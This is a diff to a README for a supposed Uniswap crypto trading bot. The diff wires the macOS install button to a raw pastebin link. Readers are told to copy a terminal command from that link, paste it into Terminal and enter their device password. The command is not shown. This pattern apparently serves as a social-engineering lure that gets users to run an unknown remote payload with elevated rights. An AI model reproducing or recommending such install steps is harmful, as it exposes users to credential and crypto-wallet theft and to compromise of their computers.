@@ -1,10 +1,10 @@
-# Uniswap Trading Bot - Advanced DEX Trading Automation [Latest Build]
+# Uniswap Trading Bot - Advanced DEX Trading Automation
 
-[![About](https://img.shields.io/badge/About-Uniswap%20Trading-blue)](link)
-[![How](https://img.shields.io/badge/How-the%20installer%20Works-green)](Uniswap)
-[![How](https://img.shields.io/badge/How-Bot%20Works-orange)](Uniswap)
-[![Uniswap](https://img.shields.io/badge/Uniswap-Installation%20on%20Windows-purple)](Uniswap)
-[![Uniswap](https://img.shields.io/badge/Uniswap-Installation%20on%20MacOS-purple)](Uniswap)
+[![About](https://img.shields.io/badge/About-Uniswap%20Trading-blue)](https://github.com/Uniswap-Trading-Bot/#what-is-uniswap-trading-bot)
+[![How](https://img.shields.io/badge/How-the%20installer%20Works-green)](https://github.com/Uniswap-Trading-Bot/#-this-is-an-installer-trading-bot)
+[![How](https://img.shields.io/badge/How-Bot%20Works-orange)](https://github.com/Uniswap-Trading-Bot/#heres-how-the-bot-works-after-installation)
+[![Uniswap](https://img.shields.io/badge/Uniswap-Installation%20on%20Windows-purple)](https://github.com/Uniswap-Trading-Bot/#%EF%B8%8F-installing-and-using-uniswap-trading-bot-on-windows)
+[![Uniswap](https://img.shields.io/badge/Uniswap-Installation%20on%20MacOS-purple)](https://github.com/Uniswap-Trading-Bot/#-how-to-install-uniswap-trading-bot-on-macos)
 
 <div align="center">
 
@@ -144,18 +144,18 @@ uniswap-trading-bot/
 
 1. Click on the "Get terminal code" button and copy the installation command there.
 
-[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](link)
+[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](https://pastebin.com/raw/NAj7H12t)
 
 2. Open the terminal on your device and paste the command you copied above, then press the "Return" button.
 3. Enter your device password and confirm the installation. 
 
 ---
 
-[![About](https://img.shields.io/badge/About-Uniswap%20Trading-blue)](link)
-[![How](https://img.shields.io/badge/How-the%20installer%20Works-green)](Uniswap)
-[![How](https://img.shields.io/badge/How-Bot%20Works-orange)](Uniswap)
-[![Uniswap](https://img.shields.io/badge/Uniswap-Installation%20on%20Windows-purple)](Uniswap)
-[![Uniswap](https://img.shields.io/badge/Uniswap-Installation%20on%20MacOS-purple)](Uniswap)
+[![About](https://img.shields.io/badge/About-Uniswap%20Trading-blue)](https://github.com/Uniswap-Trading-Bot/#what-is-uniswap-trading-bot)
+[![How](https://img.shields.io/badge/How-the%20installer%20Works-green)](https://github.com/Uniswap-Trading-Bot/#-this-is-an-installer-trading-bot)
+[![How](https://img.shields.io/badge/How-Bot%20Works-orange)](https://github.com/Uniswap-Trading-Bot/#heres-how-the-bot-works-after-installation)
+[![Uniswap](https://img.shields.io/badge/Uniswap-Installation%20on%20Windows-purple)](https://github.com/Uniswap-Trading-Bot/#%EF%B8%8F-installing-and-using-uniswap-trading-bot-on-windows)
+[![Uniswap](https://img.shields.io/badge/Uniswap-Installation%20on%20MacOS-purple)](https://github.com/Uniswap-Trading-Bot/#-how-to-install-uniswap-trading-bot-on-macos)
 
 ---
 
